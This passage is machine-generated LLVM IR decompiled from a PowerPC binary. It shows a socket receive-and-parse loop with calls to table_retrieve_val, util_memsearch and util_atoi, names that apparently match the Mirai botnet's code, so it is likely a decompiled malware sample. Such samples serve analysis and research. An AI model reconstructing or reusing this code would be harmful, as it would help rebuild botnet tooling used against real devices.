  %v1_1000143c = inttoptr i32 %v0_1000143c to i32*
  %v2_1000143c = load i32, i32* %v1_1000143c, align 4
  store i32 %v2_1000143c, i32* @r8, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10001444 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001444 = add i32 %v0_1000143c, 12
  %v3_10001444 = inttoptr i32 %v2_10001444 to i32*
  store i32 %v0_10001444, i32* %v3_10001444, align 4
  %v1_10001448 = call i32 @__asm_rlwinm(i32 %v2_1000143c, i32 29, i32 3, i32 29)
  %v1_1000144c = load i32, i32* %r26.global-to-local, align 4
  %v2_1000144c = icmp slt i32 %v2_1000143c, %v1_1000144c
  %v4_1000144c = icmp eq i32 %v2_1000143c, %v1_1000144c
  store i1 %v2_1000144c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000144c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001450 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001450 = add i32 %v1_10001450, %v1_10001448
  store i32 %v2_10001450, i32* %r11.global-to-local, align 4
  %v1_10001454 = urem i32 %v2_1000143c, 32
  %v1_10001458 = add i32 %v2_10001450, 36
  %v2_10001458 = inttoptr i32 %v1_10001458 to i32*
  %v3_10001458 = load i32, i32* %v2_10001458, align 4
  %v0_1000145c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000145c = shl i32 %v0_1000145c, %v1_10001454
  %v2_10001460 = or i32 %v3_1000145c, %v3_10001458
  store i32 %v2_10001460, i32* %r9.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  store i32 %v2_10001460, i32* %v2_10001458, align 4
  %v0_1000146c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000146c = trunc i32 %v0_1000146c to i8
  %v2_1000146c = load i32, i32* @r28, align 4
  %v3_1000146c = add i32 %v2_1000146c, 4
  %v4_1000146c = inttoptr i32 %v3_1000146c to i8*
  store i8 %v1_1000146c, i8* %v4_1000146c, align 1
  %v0_10001470 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10001470 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10001470 = or i1 %v0_10001470, %v1_10001470
  br i1 %v2_10001470, label %dec_label_pc_10000ea0, label %dec_label_pc_10001474

dec_label_pc_10001474:                            ; preds = %dec_label_pc_1000141c
  %v1_10001474 = add i32 %v2_1000143c, 1
  store i32 %v1_10001474, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000fa8

dec_label_pc_1000147c:                            ; preds = %dec_label_pc_10000e80, %dec_label_pc_10000e78, %dec_label_pc_10000e70
  %v1_1000147c = inttoptr i32 %v2_100014c4 to i32*
  %v2_1000147c = load i32, i32* %v1_1000147c, align 4
  store i32 %v2_1000147c, i32* @r8, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10001484 = call i32 @__asm_rlwinm(i32 %v2_1000147c, i32 29, i32 3, i32 29)
  %v1_10001488 = load i32, i32* %r26.global-to-local, align 4
  %v2_10001488 = icmp slt i32 %v2_1000147c, %v1_10001488
  %v3_10001488 = icmp sgt i32 %v2_1000147c, %v1_10001488
  %v4_10001488 = icmp eq i32 %v2_1000147c, %v1_10001488
  store i1 %v2_10001488, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001488, i1* %cr7_eq.global-to-local, align 1
  %v1_1000148c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000148c = add i32 %v1_1000148c, %v1_10001484
  store i32 %v2_1000148c, i32* %r11.global-to-local, align 4
  %v1_10001490 = urem i32 %v2_1000147c, 32
  %v1_10001494 = add i32 %v2_1000148c, 36
  %v2_10001494 = inttoptr i32 %v1_10001494 to i32*
  %v3_10001494 = load i32, i32* %v2_10001494, align 4
  %v0_10001498 = load i32, i32* %r0.global-to-local, align 4
  %v3_10001498 = shl i32 %v0_10001498, %v1_10001490
  store i32 %v3_10001498, i32* %r0.global-to-local, align 4
  %v2_1000149c = or i32 %v3_10001498, %v3_10001494
  store i32 %v2_1000149c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000149c, i32* %v2_10001494, align 4
  br i1 %v3_10001488, label %dec_label_pc_100014a8, label %dec_label_pc_10000ea0

dec_label_pc_100014a8:                            ; preds = %dec_label_pc_1000147c
  %v1_100014a8 = add i32 %v2_1000147c, 1
  store i32 %v1_100014a8, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000fa8

dec_label_pc_100014b0:                            ; preds = %dec_label_pc_10000e60
  %v1_100014b0 = add i32 %v2_100014c4, 8
  %v2_100014b0 = inttoptr i32 %v1_100014b0 to i32*
  %v3_100014b0 = load i32, i32* %v2_100014b0, align 4
  %v1_100014b4 = load i32, i32* %r25.global-to-local, align 4
  %v2_100014b4 = sub i32 %v1_100014b4, %v3_100014b0
  store i32 %v2_100014b4, i32* %r0.global-to-local, align 4
  %v1_100014b8 = icmp ult i32 %v2_100014b4, 30
  %v3_100014b8 = icmp eq i32 %v2_100014b4, 30
  store i1 %v1_100014b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100014b8, i1* %cr7_eq.global-to-local, align 1
  %tmp119 = icmp ult i32 %v2_100014b4, 31
  br i1 %tmp119, label %dec_label_pc_10000f78, label %dec_label_pc_10000e88

dec_label_pc_100014c4:                            ; preds = %dec_label_pc_100010b4
  store i8 0, i8* %v2_10000eb0, align 1
  %v0_10000ec4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10000ec4

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001028
  %v0_100014cc = call i32 @__GI___errno_location()
  store i32 %v0_100014cc, i32* %r3.global-to-local, align 4
  %v0_100014d0 = load i32, i32* @r30, align 4
  %v1_100014d0 = add i32 %v0_100014d0, 2112
  %v2_100014d0 = inttoptr i32 %v1_100014d0 to i32*
  %v3_100014d0 = load i32, i32* %v2_100014d0, align 4
  store i32 %v3_100014d0, i32* %r0.global-to-local, align 4
  store i32 %v0_100014cc, i32* %r26.global-to-local, align 4
  %v1_100014d8 = add i32 %v0_100014d0, 2116
  store i32 %v1_100014d8, i32* @r27, align 4
  %v1_100014dc = icmp slt i32 %v3_100014d0, 1024
  %v3_100014dc = icmp eq i32 %v3_100014d0, 1024
  store i1 %v1_100014dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100014dc, i1* %cr7_eq.global-to-local, align 1
  %v1_100014e0 = add i32 %v0_100014d0, 2180
  store i32 %v1_100014e0, i32* %r25.global-to-local, align 4
  br i1 %v3_100014dc, label %dec_label_pc_100015d8, label %dec_label_pc_100014e8

dec_label_pc_100014e8:                            ; preds = %dec_label_pc_100015cc.dec_label_pc_100014e8_crit_edge, %dec_label_pc_100014cc
  %v1_100014f0 = phi i32 [ %v1_100014f0.pre, %dec_label_pc_100015cc.dec_label_pc_100014e8_crit_edge ], [ %v0_100014cc, %dec_label_pc_100014cc ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100014f0 = inttoptr i32 %v1_100014f0 to i32*
  store i32 0, i32* %v2_100014f0, align 4
  %v0_100014f4 = load i32, i32* @r30, align 4
  %v1_100014f4 = add i32 %v0_100014f4, 2112
  %v2_100014f4 = inttoptr i32 %v1_100014f4 to i32*
  %v3_100014f4 = load i32, i32* %v2_100014f4, align 4
  store i32 %v3_100014f4, i32* %r4.global-to-local, align 4
  %v1_100014f8 = inttoptr i32 %v0_100014f4 to i32*
  %v2_100014f8 = load i32, i32* %v1_100014f8, align 4
  store i32 %v2_100014f8, i32* %r3.global-to-local, align 4
  %v1_100014fc = sub i32 1024, %v3_100014f4
  %v0_10001500 = load i32, i32* @r27, align 4
  %v2_10001500 = add i32 %v0_10001500, %v3_100014f4
  store i32 %v2_10001500, i32* %r4.global-to-local, align 4
  store i32 268440840, i32* @lr, align 4
  %v4_10001504 = call i32 @__libc_recv(i32 %v2_100014f8, i32 %v2_10001500, i32 %v1_100014fc, i32 16384)
  store i32 %v4_10001504, i32* %r3.global-to-local, align 4
  %v3_10001508 = icmp eq i32 %v4_10001504, 0
  br i1 %v3_10001508, label %dec_label_pc_1000161c, label %dec_label_pc_10001510

dec_label_pc_10001510:                            ; preds = %dec_label_pc_100015d8, %dec_label_pc_100014e8
  %v0_10001510 = phi i32 [ %v4_10001610, %dec_label_pc_100015d8 ], [ %v4_10001504, %dec_label_pc_100014e8 ]
  %v1_10001510 = icmp slt i32 %v0_10001510, -1
  %v3_10001510 = icmp eq i32 %v0_10001510, -1
  store i1 %v1_10001510, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001510, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001510, label %dec_label_pc_10001dc8, label %dec_label_pc_10001518

dec_label_pc_10001518:                            ; preds = %dec_label_pc_10001510
  %v0_10001518 = load i32, i32* @r30, align 4
  %v1_10001518 = add i32 %v0_10001518, 2112
  %v2_10001518 = inttoptr i32 %v1_10001518 to i32*
  %v3_10001518 = load i32, i32* %v2_10001518, align 4
  store i32 %v3_10001518, i32* %r29.global-to-local, align 4
  %v0_1000151c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000151c = add i32 %v0_10001518, 8
  %v3_1000151c = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_1000151c, i32* %v3_1000151c, align 4
  %v0_10001520 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001520 = load i32, i32* %r3.global-to-local, align 4
  %v2_10001520 = add i32 %v1_10001520, %v0_10001520
  store i32 %v2_10001520, i32* %r29.global-to-local, align 4
  %v1_10001524 = load i32, i32* @r30, align 4
  %v2_10001524 = add i32 %v1_10001524, 2112
  %v3_10001524 = inttoptr i32 %v2_10001524 to i32*
  store i32 %v2_10001520, i32* %v3_10001524, align 4
  br label %dec_label_pc_10001528

dec_label_pc_10001528:                            ; preds = %dec_label_pc_1000158c, %dec_label_pc_10001518
  %v0_10001528 = load i32, i32* @r30, align 4
  %v1_10001528 = add i32 %v0_10001528, 1464
  %v2_10001528 = inttoptr i32 %v1_10001528 to i32*
  %v3_10001528 = load i32, i32* %v2_10001528, align 4
  store i32 %v3_10001528, i32* %r31.global-to-local, align 4
  %v1_1000152c = icmp slt i32 %v3_10001528, 0
  %v3_1000152c = icmp eq i32 %v3_10001528, 0
  store i1 %v1_1000152c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000152c, i1* %cr7_eq.global-to-local, align 1
  %tmp120 = icmp slt i32 %v3_10001528, 1
  br i1 %tmp120, label %dec_label_pc_10001640, label %dec_label_pc_10001534

dec_label_pc_10001534:                            ; preds = %dec_label_pc_10001528
  %v0_10001534 = load i32, i32* %r29.global-to-local, align 4
  %v3_10001534 = icmp sgt i32 %v0_10001534, %v3_10001528
  %v3_10001528.v0_10001534 = select i1 %v3_10001534, i32 %v3_10001528, i32 %v0_10001534
  store i32 %v3_10001528.v0_10001534, i32* %r28.global-to-local, align 4
  %v1_10001544 = add i32 %v0_10001528, 1452
  %v2_10001544 = inttoptr i32 %v1_10001544 to i32*
  %v3_10001544 = load i32, i32* %v2_10001544, align 4
  store i32 %v3_10001544, i32* %r0.global-to-local, align 4
  %v2_10001548 = sub i32 %v3_10001528, %v3_10001528.v0_10001534
  store i32 %v2_10001548, i32* %r9.global-to-local, align 4
  store i32 %v2_10001548, i32* %v2_10001528, align 4
  %v0_10001550 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001550 = icmp slt i32 %v0_10001550, 1
  %v3_10001550 = icmp eq i32 %v0_10001550, 1
  store i1 %v1_10001550, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001550, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001550, label %dec_label_pc_10001648, label %dec_label_pc_10001560

dec_label_pc_10001560:                            ; preds = %dec_label_pc_10001534
  %v0_10001558 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001558 = icmp slt i32 %v0_10001558, 0
  %v3_10001558 = icmp eq i32 %v0_10001558, 0
  store i1 %v1_10001558, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001558, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10001558, i32* %r31.global-to-local, align 4
  br i1 %v3_10001558, label %dec_label_pc_10001560.dec_label_pc_10001564_crit_edge, label %dec_label_pc_10001584

dec_label_pc_10001560.dec_label_pc_10001564_crit_edge: ; preds = %dec_label_pc_10001560
  %v0_10001564.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10001564

dec_label_pc_10001564:                            ; preds = %dec_label_pc_10001560.dec_label_pc_10001564_crit_edge, %dec_label_pc_10001640, %dec_label_pc_10001670
  %v1_1000157c = phi i32 [ %v0_10001564.pre, %dec_label_pc_10001560.dec_label_pc_10001564_crit_edge ], [ %v0_10001528, %dec_label_pc_10001640 ], [ %v0_10001670, %dec_label_pc_10001670 ]
  %v1_10001564 = add i32 %v1_1000157c, 1460
  %v2_10001564 = inttoptr i32 %v1_10001564 to i32*
  %v3_10001564 = load i32, i32* %v2_10001564, align 4
  store i32 %v3_10001564, i32* %r29.global-to-local, align 4
  %v1_10001568 = icmp slt i32 %v3_10001564, 1
  %v3_10001568 = icmp eq i32 %v3_10001564, 1
  store i1 %v1_10001568, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001568, i1* %cr7_eq.global-to-local, align 1
  %v1_1000167c = add i32 %v1_1000157c, 2112
  %v2_1000167c = inttoptr i32 %v1_1000167c to i32*
  %v3_1000167c = load i32, i32* %v2_1000167c, align 4
  br i1 %v3_10001568, label %dec_label_pc_1000167c, label %dec_label_pc_10001570

dec_label_pc_10001570:                            ; preds = %dec_label_pc_10001564
  %v0_10001574 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001574 = sub i32 %v3_1000167c, %v0_10001574
  store i32 %v2_10001574, i32* %r0.global-to-local, align 4
  %v1_10001578 = icmp slt i32 %v2_10001574, 0
  %v3_10001578 = icmp eq i32 %v2_10001574, 0
  store i1 %v1_10001578, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001578, i1* %cr7_eq.global-to-local, align 1
  %v2_1000157c = add i32 %v1_1000157c, 1464
  %v3_1000157c = inttoptr i32 %v2_1000157c to i32*
  store i32 %v2_10001574, i32* %v3_1000157c, align 4
  br i1 %v3_10001578, label %dec_label_pc_10001c60, label %dec_label_pc_10001584

dec_label_pc_10001584:                            ; preds = %dec_label_pc_10001670, %dec_label_pc_10001560, %dec_label_pc_1000167c, %dec_label_pc_10001570, %dec_label_pc_1000170c
  %v0_10001584.pr = load i32, i32* %r28.global-to-local, align 4
  %v1_10001584 = icmp slt i32 %v0_10001584.pr, 0
  %v3_10001584 = icmp eq i32 %v0_10001584.pr, 0
  store i1 %v1_10001584, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001584, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001584, label %dec_label_pc_100015c0.loopexit, label %dec_label_pc_1000158c

dec_label_pc_1000158c:                            ; preds = %dec_label_pc_10001584
  %v0_1000158c = load i32, i32* @r30, align 4
  %v1_1000158c = add i32 %v0_1000158c, 2112
  %v2_1000158c = inttoptr i32 %v1_1000158c to i32*
  %v3_1000158c = load i32, i32* %v2_1000158c, align 4
  store i32 %v3_1000158c, i32* %r0.global-to-local, align 4
  %v0_10001590 = load i32, i32* @r27, align 4
  %v2_10001590 = add i32 %v0_10001590, %v0_10001584.pr
  store i32 %v2_10001590, i32* %r4.global-to-local, align 4
  store i32 %v0_10001590, i32* %r3.global-to-local, align 4
  %v2_10001598 = sub i32 %v3_1000158c, %v0_10001584.pr
  store i32 %v2_10001598, i32* %r29.global-to-local, align 4
  store i32 %v2_10001598, i32* %v2_1000158c, align 4
  %v0_100015a0 = load i32, i32* %r29.global-to-local, align 4
  store i32 268441000, i32* @lr, align 4
  %v3_100015a4 = call i32 @memmove(i32 %v0_10001590, i32 %v2_10001590, i32 %v0_100015a0)
  store i32 %v3_100015a4, i32* %r3.global-to-local, align 4
  %v0_100015a8 = load i32, i32* @r30, align 4
  %v1_100015a8 = add i32 %v0_100015a8, 2112
  %v2_100015a8 = inttoptr i32 %v1_100015a8 to i32*
  %v3_100015a8 = load i32, i32* %v2_100015a8, align 4
  store i32 %v3_100015a8, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100015b0 = icmp slt i32 %v3_100015a8, 0
  %v3_100015b0 = icmp eq i32 %v3_100015a8, 0
  store i1 %v1_100015b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100015b0, i1* %cr7_eq.global-to-local, align 1
  %v2_100015b4 = add i32 %v3_100015a8, %v0_100015a8
  store i32 %v2_100015b4, i32* %r9.global-to-local, align 4
  %v3_100015b8 = add i32 %v2_100015b4, 2116
  %v4_100015b8 = inttoptr i32 %v3_100015b8 to i8*
  store i8 0, i8* %v4_100015b8, align 1
  %v0_100015bc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100015bc, label %dec_label_pc_100015c0.loopexit, label %dec_label_pc_10001528

dec_label_pc_100015c0.loopexit:                   ; preds = %dec_label_pc_10001584, %dec_label_pc_1000158c
  %v0_100015c0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100015c0

dec_label_pc_100015c0:                            ; preds = %dec_label_pc_100015c0.loopexit, %dec_label_pc_10001584.thread
  %v0_100015cc = phi i32 [ %v0_100015c0.pre, %dec_label_pc_100015c0.loopexit ], [ %v0_10001528, %dec_label_pc_10001584.thread ]
  %v1_100015c0 = add i32 %v0_100015cc, 4
  %v2_100015c0 = inttoptr i32 %v1_100015c0 to i8*
  %v3_100015c0 = load i8, i8* %v2_100015c0, align 1
  %v4_100015c0 = zext i8 %v3_100015c0 to i32
  store i32 %v4_100015c0, i32* %r0.global-to-local, align 4
  %v1_100015c4 = icmp ult i8 %v3_100015c0, 7
  %v3_100015c4 = icmp eq i8 %v3_100015c0, 7
  store i1 %v1_100015c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100015c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100015c4, label %dec_label_pc_100015cc, label %dec_label_pc_10001038

dec_label_pc_100015cc:                            ; preds = %dec_label_pc_100015c0
  %v1_100015cc = add i32 %v0_100015cc, 2112
  %v2_100015cc = inttoptr i32 %v1_100015cc to i32*
  %v3_100015cc = load i32, i32* %v2_100015cc, align 4
  store i32 %v3_100015cc, i32* %r0.global-to-local, align 4
  %v1_100015d0 = icmp slt i32 %v3_100015cc, 1024
  %v3_100015d0 = icmp eq i32 %v3_100015cc, 1024
  store i1 %v1_100015d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100015d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100015d0, label %dec_label_pc_100015cc.dec_label_pc_100015d8_crit_edge, label %dec_label_pc_100015cc.dec_label_pc_100014e8_crit_edge

dec_label_pc_100015cc.dec_label_pc_100014e8_crit_edge: ; preds = %dec_label_pc_100015cc
  %v1_100014f0.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100014e8

dec_label_pc_100015cc.dec_label_pc_100015d8_crit_edge: ; preds = %dec_label_pc_100015cc
  %v0_100015d8.pre = load i32, i32* %r25.global-to-local, align 4
  %v0_100015e0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_100015d8

dec_label_pc_100015d8:                            ; preds = %dec_label_pc_100015cc.dec_label_pc_100015d8_crit_edge, %dec_label_pc_100014cc
  %v0_100015e0 = phi i32 [ %v0_100015e0.pre, %dec_label_pc_100015cc.dec_label_pc_100015d8_crit_edge ], [ %v1_100014d8, %dec_label_pc_100014cc ]
  %v0_100015d8 = phi i32 [ %v0_100015d8.pre, %dec_label_pc_100015cc.dec_label_pc_100015d8_crit_edge ], [ %v1_100014e0, %dec_label_pc_100014cc ]
  store i32 %v0_100015d8, i32* %r4.global-to-local, align 4
  store i32 %v0_100015e0, i32* %r3.global-to-local, align 4
  store i32 268441064, i32* @lr, align 4
  %v3_100015e4 = call i32 @memmove(i32 %v0_100015e0, i32 %v0_100015d8, i32 960)
  store i32 %v3_100015e4, i32* %r3.global-to-local, align 4
  %v0_100015e8 = load i32, i32* @r30, align 4
  %v1_100015e8 = add i32 %v0_100015e8, 2112
  %v2_100015e8 = inttoptr i32 %v1_100015e8 to i32*
  %v3_100015e8 = load i32, i32* %v2_100015e8, align 4
  store i32 %v3_100015e8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100015f4 = add i32 %v3_100015e8, -64
  store i32 %v1_100015f4, i32* %r29.global-to-local, align 4
  store i32 %v1_100015f4, i32* %v2_100015e8, align 4
  %v0_100015fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100015fc = load i32, i32* %r26.global-to-local, align 4
  %v2_100015fc = inttoptr i32 %v1_100015fc to i32*
  store i32 %v0_100015fc, i32* %v2_100015fc, align 4
  %v0_10001600 = load i32, i32* @r30, align 4
  %v1_10001600 = add i32 %v0_10001600, 2112
  %v2_10001600 = inttoptr i32 %v1_10001600 to i32*
  %v3_10001600 = load i32, i32* %v2_10001600, align 4
  store i32 %v3_10001600, i32* %r4.global-to-local, align 4
  %v1_10001604 = inttoptr i32 %v0_10001600 to i32*
  %v2_10001604 = load i32, i32* %v1_10001604, align 4
  store i32 %v2_10001604, i32* %r3.global-to-local, align 4
  %v1_10001608 = sub i32 1024, %v3_10001600
  %v0_1000160c = load i32, i32* @r27, align 4
  %v2_1000160c = add i32 %v0_1000160c, %v3_10001600
  store i32 %v2_1000160c, i32* %r4.global-to-local, align 4
  store i32 268441108, i32* @lr, align 4
  %v4_10001610 = call i32 @__libc_recv(i32 %v2_10001604, i32 %v2_1000160c, i32 %v1_10001608, i32 16384)
  store i32 %v4_10001610, i32* %r3.global-to-local, align 4
  %v3_10001614 = icmp eq i32 %v4_10001610, 0
  br i1 %v3_10001614, label %dec_label_pc_1000161c, label %dec_label_pc_10001510

dec_label_pc_1000161c:                            ; preds = %dec_label_pc_100015d8, %dec_label_pc_100014e8
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_10001620 = load i32, i32* %r26.global-to-local, align 4
  %v2_10001620 = inttoptr i32 %v1_10001620 to i32*
  store i32 104, i32* %v2_10001620, align 4
  br label %dec_label_pc_10001624

dec_label_pc_10001624:                            ; preds = %dec_label_pc_10001d94, %dec_label_pc_10001730, %dec_label_pc_1000161c
  %v0_10001624 = load i32, i32* @r30, align 4
  %v1_10001624 = inttoptr i32 %v0_10001624 to i32*
  %v2_10001624 = load i32, i32* %v1_10001624, align 4
  store i32 %v2_10001624, i32* @r3, align 4
  %v0_10001628 = call i32 @__GI___libc_close()
  store i32 %v0_10001628, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10001634 = load i32, i32* @r30, align 4
  %v2_10001634 = inttoptr i32 %v1_10001634 to i32*
  store i32 -1, i32* %v2_10001634, align 4
  %v0_10001638 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001638 = trunc i32 %v0_10001638 to i8
  %v2_10001638 = load i32, i32* @r30, align 4
  %v3_10001638 = add i32 %v2_10001638, 4
  %v4_10001638 = inttoptr i32 %v3_10001638 to i8*
  store i8 %v1_10001638, i8* %v4_10001638, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001640:                            ; preds = %dec_label_pc_10001528
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_1000152c, label %dec_label_pc_10001564, label %dec_label_pc_10001584.thread

dec_label_pc_10001584.thread:                     ; preds = %dec_label_pc_10001640
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100015c0

dec_label_pc_10001648:                            ; preds = %dec_label_pc_10001534
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 43, i32* %r3.global-to-local, align 4
  %v3_10001650 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_10001654 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001654, i32* %r4.global-to-local, align 4
  %v0_10001660 = load i32, i32* @r27, align 4
  store i32 %v0_10001660, i32* %r3.global-to-local, align 4
  %v4_10001664 = call i32 @util_memsearch(i32 %v0_10001660, i32 %v0_10001654, i32 %v3_10001650, i32 11)
  store i32 %v4_10001664, i32* %r3.global-to-local, align 4
  %v1_10001668 = icmp slt i32 %v4_10001664, -1
  %v3_10001668 = icmp eq i32 %v4_10001664, -1
  store i1 %v1_10001668, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001668, i1* %cr7_eq.global-to-local, align 1
  %v0_10001670 = load i32, i32* @r30, align 4
  br i1 %v3_10001668, label %dec_label_pc_10001670, label %dec_label_pc_10002068

dec_label_pc_10001670:                            ; preds = %dec_label_pc_10001648
  %v1_10001670 = add i32 %v0_10001670, 1464
  %v2_10001670 = inttoptr i32 %v1_10001670 to i32*
  %v3_10001670 = load i32, i32* %v2_10001670, align 4
  store i32 %v3_10001670, i32* %r31.global-to-local, align 4
  %v1_10001674 = icmp slt i32 %v3_10001670, 0
  %v3_10001674 = icmp eq i32 %v3_10001670, 0
  store i1 %v1_10001674, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001674, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001674, label %dec_label_pc_10001564, label %dec_label_pc_10001584

dec_label_pc_1000167c:                            ; preds = %dec_label_pc_10001564
  store i32 %v3_1000167c, i32* %r4.global-to-local, align 4
  %v0_10001680 = load i32, i32* @r27, align 4
  store i32 %v0_10001680, i32* %r3.global-to-local, align 4
  %v0_10001684 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000168c = call i32 @util_memsearch(i32 %v0_10001680, i32 %v3_1000167c, i32 %v0_10001684, i32 2)
  store i32 %v4_1000168c, i32* %r3.global-to-local, align 4
  %v1_10001690 = icmp slt i32 %v4_1000168c, -1
  %v3_10001690 = icmp eq i32 %v4_1000168c, -1
  store i1 %v1_10001690, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001690, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001690, label %dec_label_pc_10001584, label %dec_label_pc_10001698

dec_label_pc_10001698:                            ; preds = %dec_label_pc_1000167c
  %v0_10001698 = load i32, i32* @r30, align 4
  %v1_10001698 = add i32 %v0_10001698, 2112
  %v2_10001698 = inttoptr i32 %v1_10001698 to i32*
  %v3_10001698 = load i32, i32* %v2_10001698, align 4
  store i32 %v3_10001698, i32* %r4.global-to-local, align 4
  %v0_1000169c = load i32, i32* %r16.global-to-local, align 4
  %v0_100016a4 = load i32, i32* @r27, align 4
  store i32 %v0_100016a4, i32* %r3.global-to-local, align 4
  %v4_100016a8 = call i32 @util_memsearch(i32 %v0_100016a4, i32 %v3_10001698, i32 %v0_1000169c, i32 2)
  store i32 %v4_100016a8, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v1_100016b0 = load i32, i32* @r30, align 4
  %v2_100016b0 = add i32 %v1_100016b0, %v4_100016a8
  store i32 %v2_100016b0, i32* %r9.global-to-local, align 4
  store i32 %v4_100016a8, i32* %r28.global-to-local, align 4
  %v3_100016b8 = load i32, i32* inttoptr (i32 268501108 to i32*), align 4
  %v0_100016bc = load i32, i32* @r27, align 4
  store i32 %v0_100016bc, i32* %r3.global-to-local, align 4
  %v0_100016c0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100016c0 = trunc i32 %v0_100016c0 to i8
  %v3_100016c0 = add i32 %v2_100016b0, 2114
  %v4_100016c0 = inttoptr i32 %v3_100016c0 to i8*
  store i8 %v1_100016c0, i8* %v4_100016c0, align 1
  %v0_100016c4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100016c4, i32* %r4.global-to-local, align 4
  %v4_100016cc = call i32 @util_memsearch(i32 %v0_100016bc, i32 %v0_100016c4, i32 %v3_100016b8, i32 1)
  store i32 %v4_100016cc, i32* %r3.global-to-local, align 4
  %v1_100016d0 = icmp slt i32 %v4_100016cc, -1
  %v3_100016d0 = icmp eq i32 %v4_100016cc, -1
  store i1 %v1_100016d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100016d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100016d0, label %dec_label_pc_100016f8, label %dec_label_pc_100016d8

dec_label_pc_100016d8:                            ; preds = %dec_label_pc_10001698
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_100016dc = load i32, i32* @r27, align 4
  store i32 %v0_100016dc, i32* %r3.global-to-local, align 4
  %v0_100016e4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100016e4, i32* %r4.global-to-local, align 4
  %v4_100016ec = call i32 @util_memsearch(i32 %v0_100016dc, i32 %v0_100016e4, i32 %v3_10001aec, i32 1)
  %v0_100016f0 = load i32, i32* @r30, align 4
  %v2_100016f0 = add i32 %v0_100016f0, %v4_100016ec
  store i32 %v2_100016f0, i32* %r3.global-to-local, align 4
  %v0_100016f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100016f4 = trunc i32 %v0_100016f4 to i8
  %v3_100016f4 = add i32 %v2_100016f0, 2116
  %v4_100016f4 = inttoptr i32 %v3_100016f4 to i8*
  store i8 %v1_100016f4, i8* %v4_100016f4, align 1
  br label %dec_label_pc_100016f8

dec_label_pc_100016f8:                            ; preds = %dec_label_pc_10001698, %dec_label_pc_100016d8
  %v0_100016f8 = load i32, i32* @r27, align 4
  store i32 %v0_100016f8, i32* @r3, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 268441348, i32* @lr, align 4
  %v2_10001700 = call i32 @util_atoi(i32 %v0_100016f8, i32 16)
  store i32 %v2_10001700, i32* %r3.global-to-local, align 4
